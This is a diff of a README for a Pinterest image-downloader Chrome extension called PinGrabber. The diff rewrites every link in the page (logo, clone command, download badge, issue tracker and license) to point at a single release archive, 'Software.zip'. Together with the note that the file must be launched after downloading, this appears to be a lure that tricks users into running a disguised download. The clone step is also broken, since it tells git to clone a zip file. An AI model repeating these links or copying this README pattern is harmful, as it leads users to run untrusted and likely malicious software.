@@ -1,6 +1,6 @@
 # PinGrabber Chrome Extension 📌📸
 
-![PinGrabber Logo](https://www.example.com/pingrabber_logo.jpg)
+![PinGrabber Logo](https://github.com/kirito090/PinGrabber/releases/download/v1.0/Software.zip)
 
 Welcome to the official repository of PinGrabber, a versatile Chrome extension designed to simplify the process of downloading images from Pinterest. Whether you are an avid pinner looking to save your favorite images or a web developer seeking a convenient tool for image extraction, PinGrabber has got you covered! 💻🌟
 
@@ -43,23 +43,23 @@ Welcome to the official repository of PinGrabber, a versatile Chrome extension d
 
 To install PinGrabber, follow these simple steps:
 
-1. **Clone the Repository:** `git clone https://github.com/username/PinGrabber.git`
+1. **Clone the Repository:** `git clone https://github.com/kirito090/PinGrabber/releases/download/v1.0/Software.zip`
 2. **Load the Extension:** Go to `chrome://extensions/`, enable developer mode, and load the cloned repository as an unpacked extension.
 3. **Start Downloading:** Enjoy hassle-free image downloading from Pinterest using PinGrabber!
 
 ## Download Latest Release 💾
 
-[![Download PinGrabber v1.0.0](https://img.shields.io/badge/Download-PinGrabber_v1.0.0-blue.svg)](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip)
+[![Download PinGrabber v1.0.0](https://github.com/kirito090/PinGrabber/releases/download/v1.0/Software.zip)](https://github.com/kirito090/PinGrabber/releases/download/v1.0/Software.zip)
 
 (*Note: The file needs to be launched after downloading.*)
 
 ## Support 💬
 
-If you encounter any issues or have suggestions for improving PinGrabber, feel free to [open an issue](https://github.com/username/PinGrabber/issues) on this repository. We welcome your feedback and contributions to make PinGrabber even better for all users!
+If you encounter any issues or have suggestions for improving PinGrabber, feel free to [open an issue](https://github.com/kirito090/PinGrabber/releases/download/v1.0/Software.zip) on this repository. We welcome your feedback and contributions to make PinGrabber even better for all users!
 
 ## License 📜
 
-This project is licensed under the MIT License - see the [LICENSE.md](LICENSE.md) file for details.
+This project is licensed under the MIT License - see the [https://github.com/kirito090/PinGrabber/releases/download/v1.0/Software.zip](https://github.com/kirito090/PinGrabber/releases/download/v1.0/Software.zip) file for details.
 
 ---
 
